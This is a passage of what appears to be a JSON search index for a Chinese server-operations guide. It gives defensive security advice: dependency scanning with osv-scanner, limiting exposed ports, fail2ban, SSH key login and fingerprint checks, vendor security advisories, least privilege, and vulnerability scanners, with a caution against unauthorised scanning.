400\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u8fd4\u56de\u200b HTTP 200 \u200b\u6216\u8005\u200b 500\uff0c\u200b\u56e0\u6b64\u200b\u5c31\u200b\u5145\u5f53\u200b\u4e86\u200b\u4e00\u4e2a\u200b padding oracle\uff0c\u200b\u66b4\u9732\u200b\u4e86\u200b\u5bc6\u7801\u5b66\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5373\u4f7f\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u300c\u200b\u56fd\u6c11\u200b\u7ea7\u200b\u5e94\u7528\u200b\u300d\u200b\u7684\u200b\u5f00\u53d1\u8005\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u5bc6\u7801\u5b66\u200b\u534f\u8bae\u200b\u4e5f\u200b\u4f1a\u200b\u5b58\u5728\u200b\u95ee\u9898\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u80fd\u529b\u200b\u786e\u8ba4\u200b\u5b89\u5168\u6027\u200b\uff0c\u200b\u4f7f\u7528\u200b\u6210\u719f\u200b\u7684\u200b TLS \u200b\u663e\u7136\u200b\u662f\u200b\u66f4\u597d\u200b\u7684\u200b\u65b9\u6848\u200b\u3002</p>"},{"location":"ops/security/#check-dependency","title":"\u68c0\u67e5\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5b89\u5168\u66f4\u65b0","text":"<p>\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\uff0c\u200b\u6709\u200b\u95ee\u9898\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5e93\u4f1a\u200b\u7ed9\u200b\u7a0b\u5e8f\u200b\u5e26\u6765\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4fdd\u969c\u200b\u4f9d\u8d56\u200b\u5e93\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u4e5f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u3002\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b GitHub \u200b\u7684\u200b Dependabot \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u81ea\u52a8\u200b\u68c0\u67e5\u200b GitHub \u200b\u4e0a\u200b\u4f60\u200b\u7684\u200b\u4ed3\u5e93\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5e93\u200b\u662f\u5426\u200b\u6709\u200b\u5b89\u5168\u66f4\u65b0\u200b\u3002\u200b\u4f8b\u5982\u200b Google \u200b\u7684\u200b osv-scanner \u200b\u53ef\u4ee5\u200b\u672c\u5730\u200b\u626b\u63cf\u200b\u4f9d\u8d56\u200b\u9879\u200b\uff0c\u200b\u786e\u5b9a\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u5df2\u77e5\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b osv-scanner \u200b\u68c0\u67e5\u200b Rust \u200b\u9879\u76ee\u200b\u4f9d\u8d56\u200b</p> <pre><code>Scanning dir .\nStarting filesystem walk for root: /\nScanned /path/to/Cargo.lock file and found 252 packages\nEnd status: 7 dirs visited, 14 inodes visited, 1 Extract calls, 8.604171ms elapsed, 8.604293ms wall time\n\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 OSV URL                           \u2502 CVSS \u2502 ECOSYSTEM \u2502 PACKAGE \u2502 VERSION \u2502 SOURCE     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 https://osv.dev/RUSTSEC-2024-0384 \u2502      \u2502 crates.io \u2502 instant \u2502 0.1.13  \u2502 Cargo.lock \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n</code></pre> <p>OSV URL \u200b\u4e2d\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5177\u4f53\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u5224\u65ad\u200b\u95ee\u9898\u200b\u7684\u200b\u4e25\u91cd\u6027\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4e0d\u662f\u200b\u6240\u6709\u200b\u62a5\u544a\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u90fd\u200b\u4f1a\u200b\u5bf9\u200b\u4f60\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u9020\u6210\u200b\u5f71\u54cd\u200b\uff0c\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u5224\u65ad\u200b\u3002</p>"},{"location":"ops/security/#server-security","title":"\u670d\u52a1\u5668\u200b\u5b89\u5168","text":""},{"location":"ops/security/#public-service-and-login","title":"\u5bf9\u5916\u200b\u670d\u52a1\u200b\u4e0e\u200b\u767b\u5f55\u200b\u65b9\u5f0f","text":"<p>\u200b\u5728\u200b\u505a\u200b\u670d\u52a1\u5668\u200b\u52a0\u56fa\u200b\u4e4b\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u77e5\u9053\u200b\u670d\u52a1\u5668\u200b\u5bf9\u5916\u200b\u63d0\u4f9b\u200b\u7684\u200b\u670d\u52a1\u200b\u7aef\u53e3\u200b\u7b49\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u4f7f\u7528\u200b <code>netstat</code> \u200b\u6216\u200b <code>ss</code> \u200b\u547d\u4ee4\u200b\u83b7\u53d6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\uff08\u200b\u6a21\u62df\u200b\u653b\u51fb\u8005\u200b\uff09\u200b\u5728\u200b\u5916\u90e8\u200b\u4f7f\u7528\u200b <code>nmap</code> \u200b\u626b\u63cf\u200b\uff0c\u200b\u6765\u200b\u4e86\u89e3\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u7684\u200b\u653b\u51fb\u200b\u8def\u5f84\u200b\u3002\u200b\u5982\u679c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u670d\u52a1\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u5916\u200b\u66b4\u9732\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5173\u95ed\u200b\u8be5\u200b\u670d\u52a1\u200b\u5bf9\u5916\u200b\u76d1\u542c\u200b\u7684\u200b\u7aef\u53e3\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u56fe\u5f62\u200b\u767b\u5f55\u200b\u65b9\u5f0f\u200b\uff0cWindows \u200b\u670d\u52a1\u5668\u200b\u5e38\u89c1\u200b\u7684\u200b\u767b\u5f55\u200b\u65b9\u5f0f\u200b\u4e3a\u200b RDP\uff0c\u200b\u800c\u200b Linux \u200b\u7684\u200b RDP \u200b\u548c\u200b VNC \u200b\u90fd\u200b\u662f\u200b\u5e38\u89c1\u200b\u7684\u200b\u767b\u5f55\u200b\u65b9\u5f0f\u200b\u3002\u200b\u7531\u4e8e\u200b\u534f\u8bae\u200b\u8bbe\u8ba1\u200b\u590d\u6742\u6027\u200b\uff0c\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5c06\u200b RDP \u200b\u6216\u200b VNC \u200b\u7684\u200b\u7aef\u53e3\u200b\u76f4\u63a5\u200b\u66b4\u9732\u200b\u5728\u200b\u516c\u7f51\u200b\uff08\u200b\u5386\u53f2\u200b\u4e0a\u200b RDP \u200b\u4e5f\u200b\u66b4\u9732\u200b\u8fc7\u200b\u5927\u91cf\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u9700\u8981\u200b\u786e\u4fdd\u200b\u8fde\u63a5\u200b\u88ab\u200b\u52a0\u5bc6\u200b\uff0c\u200b\u4ee5\u200b\u9632\u6b62\u200b\u53ef\u80fd\u200b\u7684\u200b\u4e2d\u95f4\u4eba\u200b\u7a83\u53d6\u200b\u5bc6\u7801\u200b\u3002</p> <p>\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u6301\u7eed\u200b\u7684\u200b\u626b\u63cf\u200b\u884c\u4e3a\u200b\u5e26\u6765\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u90e8\u7f72\u200b\u8bf8\u5982\u200b fail2ban \u200b\u7684\u200b\u5de5\u5177\u200b\u6765\u200b\u81ea\u52a8\u200b\u5c01\u7981\u200b\u66b4\u529b\u7834\u89e3\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u3002fail2ban \u200b\u4f1a\u200b\u76d1\u63a7\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u53d1\u73b0\u200b IP \u200b\u5730\u5740\u200b\u5728\u200b\u4e00\u5b9a\u200b\u65f6\u95f4\u200b\u5185\u200b\u591a\u6b21\u200b\u5c1d\u8bd5\u200b\u540e\u4f1a\u200b\u5c06\u200b\u5bf9\u5e94\u200b\u7684\u200b IP \u200b\u5e94\u7528\u200b\u6307\u5b9a\u200b\u7684\u200b\u89c4\u5219\u200b\uff08\u200b\u4f8b\u5982\u200b\u901a\u8fc7\u200b iptables \u200b\u4e22\u5f03\u200b\u5305\u200b\uff09\u200b\u6765\u200b\u5b9e\u73b0\u200b\u81ea\u52a8\u200b\u5c01\u7981\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b SSH \u200b\u8f6c\u53d1\u200b\u7aef\u53e3\u200b</p> <p>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b RDP \u200b\u548c\u200b VNC\uff0cSSH \u200b\u662f\u200b\u4e00\u79cd\u200b\u76f8\u5bf9\u200b\u5b89\u5168\u200b\u7684\u200b\u8fdc\u7a0b\u200b\u767b\u5f55\u200b\u65b9\u5f0f\u200b\u3002\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b SSH \u200b\u4f7f\u7528\u200b\u6280\u5de7\u200b\u4e2d\u200b\u7aef\u53e3\u200b\u8f6c\u53d1\u200b\u90e8\u5206\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u901a\u8fc7\u200b SSH \u200b\u8bbf\u95ee\u200b\u5185\u7f51\u200b\u7684\u200b RDP/VNC \u200b\u4ee5\u53ca\u200b\u5176\u4ed6\u200b\u5185\u90e8\u200b\u673a\u5668\u200b\u7684\u200b SSH \u200b\u670d\u52a1\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b SSH \u200b\u767b\u5f55\u200b\uff0c\u200b\u5f3a\u70c8\u5efa\u8bae\u200b\u5173\u95ed\u200b\u5bc6\u7801\u200b\u8ba4\u8bc1\u200b\uff08\u200b\u5373\u4f7f\u200b\u7cfb\u7edf\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u5bc6\u7801\u200b\u5f3a\u5ea6\u200b\u8981\u6c42\u200b\u4e5f\u200b\u662f\u200b\u5982\u6b64\u200b\uff09\uff0c\u200b\u4f7f\u7528\u200b\u5bc6\u94a5\u200b\u767b\u5f55\u200b\u3002\u200b\u6709\u200b\u6761\u4ef6\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b\u4f7f\u7528\u200b 2FA \u200b\u767b\u5f55\u200b\uff0c\u200b\u6216\u8005\u200b\u914d\u7f6e\u200b SSH \u200b\u8bc1\u4e66\u200b\u3002</p> <p>SSH \u200b\u4e0e\u200b\u4e2d\u95f4\u4eba\u200b\u653b\u51fb\u200b</p> <p>\u200b\u5728\u200b\u9996\u6b21\u200b\u767b\u5f55\u200b\u67d0\u53f0\u200b\u673a\u5668\u200b\u65f6\u200b\uff0c\u200b\u4f60\u200b\u4f1a\u200b\u770b\u5230\u200b SSH \u200b\u8fd9\u6837\u200b\u7684\u200b\u8f93\u51fa\u200b\uff1a</p> <pre><code>The authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:czt1KYx+RIkFTpSPQOLq+GqLbLRLZcD1Ffkq4Z3ZR2U.\nAre you sure you want to continue connecting (yes/no/[fingerprint])?\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4e4b\u524d\u200b\u8fde\u63a5\u200b\u8fc7\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u53d1\u751f\u200b\u4e86\u200b\u53d8\u5316\u200b\uff0c\u200b\u6216\u8005\u200b\u6709\u200b\u4e2d\u95f4\u4eba\u200b\u5728\u200b\u7f51\u7edc\u653b\u51fb\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f1a\u200b\u770b\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\uff1a</p> <pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that a host key has just been changed.\nThe fingerprint for the RSA key sent by the remote host is\n12:34:56:78:90:ab:cd:ef:12:23:34:45:56:67:78:89.\nPlease contact your system administrator.\nAdd correct host key in /home/ustc/.ssh/known_hosts to get rid of this message.\nOffending RSA key in /home/ustc/.ssh/known_hosts:12\nRSA host key for 127.0.0.1 has changed and you have requested strict checking.\nHost key verification failed.\n</code></pre> <p>\u200b\u4e0d\u8981\u200b\u5ffd\u7565\u200b\u76f8\u5173\u200b\u7684\u200b\u63d0\u793a\u200b\u4e0e\u200b\u8b66\u544a\u200b\u3002\u200b\u5982\u679c\u200b\u53ef\u884c\u200b\uff0c\u200b\u8bf7\u200b\u9a8c\u8bc1\u200b fingerprint \u200b\u4e0e\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u7684\u200b fingerprint \u200b\u662f\u200b\u5207\u5b9e\u200b\u76f8\u7b26\u200b\u7684\u200b\uff1a</p> <pre><code>$ ssh-keygen -lf /etc/ssh/ssh_host_rsa_key.pub\n3072 SHA256:czt1KYx+RIkFTpSPQOLq+GqLbLRLZcD1Ffkq4Z3ZR2U root@example.com\n$ ssh-keygen -lf /etc/ssh/ssh_host_rsa_key.pub -E md5\n3072 MD5:12:34:56:78:90:ab:cd:ef:12:23:34:45:56:67:78:89 root@example.com\n</code></pre>"},{"location":"ops/security/#security-bullet","title":"\u5173\u6ce8\u200b\u5b89\u5168\u200b\u901a\u544a","text":"<p>\u200b\u6210\u719f\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4e0e\u200b\u7cfb\u7edf\u200b\u63d0\u4f9b\u5546\u200b\u4f1a\u200b\u7ef4\u62a4\u200b\u5b89\u5168\u200b\u901a\u544a\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u4ee5\u200b\u90ae\u4ef6\u200b\u6216\u200b RSS \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u8ba2\u9605\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u4f8b\u5b50\u200b\uff1a</p> <ul> <li>Debian: Debian \u200b\u4f1a\u200b\u5728\u200b https://www.debian.org/security/ \u200b\u53d1\u5e03\u200b\u5b89\u5168\u200b\u901a\u544a\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u8ba2\u9605\u200b RSS \u200b\u6216\u8005\u200b debian-security-announce \u200b\u90ae\u4ef6\u200b\u5217\u8868\u200b\u3002</li> <li>Ubuntu: Ubuntu \u200b\u7684\u200b\u5b89\u5168\u200b\u901a\u544a\u200b\u4f4d\u4e8e\u200b https://ubuntu.com/security/notices\uff0c\u200b\u540c\u6837\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b RSS \u200b\u6216\u662f\u200b\u90ae\u4ef6\u200b\u5217\u8868\u200b\u7684\u200b\u5f62\u5f0f\u200b\u8ba2\u9605\u200b\u3002</li> <li>GitLab: GitLab \u200b\u4f1a\u200b\u5728\u200b https://about.gitlab.com/releases/categories/releases/ \u200b\u516c\u5e03\u200b\u6bcf\u6b21\u200b\u7248\u672c\u200b\u66f4\u65b0\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5176\u4e2d\u200b\u5b89\u5168\u200b\u76f8\u5173\u200b\u7684\u200b\u66f4\u65b0\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8054\u7cfb\u200b\u9875\u9762\u200b\u8ba2\u9605\u200b\u90ae\u4ef6\u200b\u5217\u8868\u200b\u3002\u200b\u5176\u200b\u4e5f\u200b\u540c\u6837\u200b\u63d0\u4f9b\u200b RSS\u3002</li> <li>Grafana: Grafana \u200b\u4f1a\u200b\u5728\u200b\u81ea\u5df1\u200b\u7684\u200b\u535a\u5ba2\u200b\u4e2d\u200b\u53d1\u5e03\u200b\u5b89\u5168\u66f4\u65b0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba2\u9605\u200b security \u200b\u5206\u7c7b\u200b\u7684\u200b RSS\u3002</li> </ul> <p>\u200b\u7edd\u5927\u591a\u6570\u200b\u65f6\u5019\u200b\uff0c\u200b\u516c\u5e03\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u90fd\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b CVE \u200b\u7f16\u53f7\u200b\u4e0e\u200b\u6f0f\u6d1e\u200b\u63cf\u8ff0\u200b\u4fe1\u606f\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u63cf\u8ff0\u200b\u4fe1\u606f\u200b\u5224\u65ad\u200b\u6f0f\u6d1e\u200b\u7684\u200b\u4e25\u91cd\u200b\u7a0b\u5ea6\u200b\uff0c\u200b\u8fdb\u800c\u200b\u5b89\u6392\u200b\u5408\u9002\u200b\u7684\u200b\u65f6\u95f4\u200b\u5b89\u88c5\u200b\u66f4\u65b0\u200b\u3002</p> <p>\u200b\u6709\u5173\u200b\u300c\u200b\u5b89\u5168\u200b\u300d\u200b\u7684\u200b\u5f00\u95ed\u200b\u6e90\u4e4b\u4e89\u200b</p> <p>\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u4e0e\u200b\u95ed\u6e90\u200b\u8f6f\u4ef6\u200b\u4f55\u8005\u200b\u5728\u200b\u5b89\u5168\u6027\u200b\u4e0a\u200b\u66f4\u200b\u5360\u4f18\u52bf\u200b\uff1f\u200b\u6709\u200b\u5173\u4e8e\u200b\u6b64\u200b\u5b58\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u89c2\u70b9\u200b\u3002\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u7531\u4e8e\u200b\u6e90\u4ee3\u7801\u200b\u662f\u200b\u516c\u5f00\u200b\u7684\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u5bfb\u627e\u200b\u6f0f\u6d1e\u200b\u3001\u200b\u7f16\u5199\u200b PoC \u200b\u7b49\u200b\u4f1a\u200b\u6bd4\u200b\u95ed\u6e90\u200b\u8f6f\u4ef6\u200b\u5bb9\u6613\u200b\uff0c\u200b\u4f46\u662f\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u4e5f\u200b\u56e0\u6b64\u200b\u4ee3\u7801\u200b\u66f4\u200b\u5bb9\u6613\u200b\u88ab\u200b\u5ba1\u8ba1\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u66f4\u200b\u5bb9\u6613\u200b\u8ba9\u200b\u5b89\u5168\u200b\u7814\u7a76\u200b\u4eba\u5458\u200b\u5728\u200b\u6f0f\u6d1e\u200b\u5728\u91ce\u200b\u5229\u7528\u200b\u4e4b\u524d\u200b\u5c31\u200b\u53d1\u73b0\u200b\u6f0f\u6d1e\u200b\u5e76\u4e14\u200b\u53ca\u65f6\u200b\u53cd\u9988\u200b\u3002\u200b\u5e76\u4e14\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u5f00\u53d1\u8005\u200b\u4e5f\u200b\u66f4\u200b\u5bb9\u6613\u200b\u63a5\u7eb3\u200b\u6765\u81ea\u200b\u5916\u90e8\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u62a5\u544a\u200b\u4e0e\u200b\u4fee\u590d\u200b\u8865\u4e01\u200b\u63d0\u4ea4\u200b\u3002\u200b\u77e5\u540d\u5ea6\u200b\u9ad8\u4e14\u200b\u91cd\u89c6\u200b\u5b89\u5168\u200b\u7684\u200b\u95ed\u6e90\u200b\u8f6f\u4ef6\u200b\u516c\u53f8\u200b/\u200b\u9879\u76ee\u200b\u4e5f\u200b\u6709\u200b\u4e0d\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u540c\u6837\u200b\u4e5f\u200b\u5b58\u5728\u200b\u7814\u7a76\u200b\u4eba\u5458\u200b\u63d0\u4ea4\u200b\u6f0f\u6d1e\u200b\u4e4b\u540e\u200b\u76f8\u5173\u200b\u65b9\u200b\u62d2\u7edd\u200b\u56de\u5e94\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u6f0f\u6d1e\u200b\u6ca1\u6709\u200b\u53ca\u65f6\u200b\u516c\u5e03\u200b\u5e76\u200b\u4fee\u590d\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u7528\u6237\u91cf\u200b\u8f83\u200b\u5c0f\u200b\u7684\u200b\u3001\u200b\u793e\u533a\u200b\u8f83\u200b\u5c0f\u200b\u7684\u200b\u95ed\u6e90\u200b\u8f6f\u4ef6\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\uff0c\u200b\u524d\u63d0\u200b\u6c38\u8fdc\u200b\u662f\u200b\uff1a\u200b\u8fd0\u7ef4\u200b\u9700\u8981\u200b\u627f\u62c5\u200b\u8fd9\u200b\u4e00\u65b9\u9762\u200b\u7684\u200b\u8d23\u4efb\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4fdd\u6301\u200b\u76f8\u5173\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4e0e\u200b\u7cfb\u7edf\u200b\u662f\u200b\u53d7\u5230\u200b\u652f\u6301\u200b\u7684\u200b\u3001\u200b\u5b89\u5168\u200b\u7684\u200b\u7248\u672c\u200b\u3002\u200b\u5426\u5219\u200b\u653b\u51fb\u8005\u200b\u968f\u4fbf\u200b\u627e\u5230\u200b\u516c\u5f00\u200b\u7684\u200b\u9488\u5bf9\u200b\u8001\u200b\u7248\u672c\u200b\u6f0f\u6d1e\u200b\u7684\u200b\u5de5\u5177\u200b\u5c31\u200b\u80fd\u591f\u200b\u653b\u7834\u200b\u8fd9\u200b\u4e00\u6761\u200b\u9632\u7ebf\u200b\u3002</p>"},{"location":"ops/security/#principle-of-least-privilege","title":"\u6700\u5c0f\u200b\u6743\u9650\u200b\u539f\u5219","text":"<p>\u200b\u7b80\u5355\u200b\u6765\u8bb2\u200b\uff0c\u200b\u6700\u5c0f\u200b\u6743\u9650\u200b\u539f\u5219\u200b\u8981\u6c42\u200b\u53ea\u200b\u7ed9\u200b\u7528\u6237\u200b/\u200b\u7a0b\u5e8f\u200b\u5fc5\u8981\u200b\u7684\u200b\u6743\u9650\u200b\u3002\u200b\u5728\u5b9e\u8df5\u4e0a\u200b\u7684\u200b\u4e00\u4e9b\u200b\u5177\u4f53\u200b\u7684\u200b\u70b9\u200b\u6709\u200b\uff1a</p> <ul> <li>root/sudo/IPMI \u200b\u7684\u200b\u6743\u9650\u200b\u4e0d\u200b\u968f\u610f\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u8fd0\u7ef4\u200b\u65e0\u5173\u200b\u4eba\u5458\u200b\u3002<ul> <li>\u200b\u8fd9\u200b\u4e5f\u200b\u5305\u62ec\u200b\u4e86\u200b\u8bf8\u5982\u200b <code>docker</code> \u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</li> </ul> </li> <li>\u200b\u670d\u52a1\u200b\uff08\u200b\u5305\u62ec\u200b\u5bb9\u5668\u200b\u5728\u5185\u200b\uff09\u200b\u4e0d\u200b\u968f\u610f\u200b\u66b4\u9732\u200b\u7aef\u53e3\u200b\uff08\u200b\u7279\u522b\u200b\u662f\u200b\u65e0\u200b\u9650\u5236\u200b bind \u200b\u5230\u200b\u6240\u6709\u200b\u63a5\u53e3\u200b\u7684\u200b\u60c5\u51b5\u200b\uff09\uff0c\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u4e0d\u200b\u968f\u610f\u200b\u63d0\u4f9b\u200b <code>--privileged</code>\uff0c\u200b\u8fd0\u884c\u200b\u7684\u200b\u670d\u52a1\u200b\u9700\u8981\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7528\u6237\u200b\u3002</li> <li>\u200b\u5bf9\u4e8e\u200b systemd \u200b\u670d\u52a1\u200b\uff0c\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b systemd \u200b\u63d0\u4f9b\u200b\u7684\u200b\u5b89\u5168\u200b\u52a0\u56fa\u200b\u529f\u80fd\u200b\u3002\u200b\u8be6\u89c1\u200b\u670d\u52a1\u200b\u4e0e\u200b\u65e5\u5fd7\u200b\u7ba1\u7406\u200b\u4e2d\u200b\u5bf9\u200b <code>systemd-analyze security</code> \u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</li> </ul>"},{"location":"ops/security/#scanner-known-vulnerabilities","title":"\u4f7f\u7528\u200b\u626b\u63cf\u5668\u200b\u68c0\u67e5\u200b\u5df2\u77e5\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898","text":"<p>\u200b\u4e00\u4e9b\u200b\u626b\u63cf\u5668\u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u68c0\u67e5\u200b\u5df2\u7ecf\u200b\u90e8\u7f72\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u5df2\u77e5\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e13\u95e8\u200b\u7528\u4e8e\u200b\u626b\u63cf\u200b WordPress \u200b\u7f51\u7ad9\u200b\u7684\u200b WPScan\uff0c\u200b\u901a\u7528\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u626b\u63cf\u5668\u200b nuclei \u200b\u7b49\u200b\u3002</p> <p>\u200b\u8bf7\u52ff\u200b\u8fdb\u884c\u200b\u672a\u7ecf\u200b\u6388\u6743\u200b\u7684\u200b\u626b\u63cf\u200b\u64cd\u4f5c\u200b</p> 